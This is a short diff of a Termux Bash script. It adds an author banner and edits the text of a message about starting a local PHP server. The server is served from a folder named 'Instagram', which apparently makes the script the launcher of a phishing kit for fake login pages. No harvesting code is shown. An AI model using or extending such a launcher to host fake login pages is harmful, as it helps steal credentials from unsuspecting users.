@@ -12,8 +12,9 @@ A=$'\e[1;36m'
 White=$'\e[1;37m'
 
 
-	
-	printf "\n ${red}[${white}-${red}]${blue} Starting PHP Server on Port: ${yellow}${port}\n"
+	printf "\n ${green}░CREATE░ ░B░Y░ ░M░A░H░A░D░E░B ░R░U░I░D░A░S░${RESET}"
+        echo ""
+	printf "\n ${red}[${white}-${red}]${blue} Starting PHP Server on Port: ${yellow}Default 8080\n"
 	cd /data/data/com.termux/files/home/Instagram && php -S 127.0.0.1:8080 > /dev/null 2>&1 &
 	sleep 2
 	printf "\n ${red}[${white}-${red}]${green} Suessfully Hosted link:=> ${yellow}http://127.0.0.1:8080"
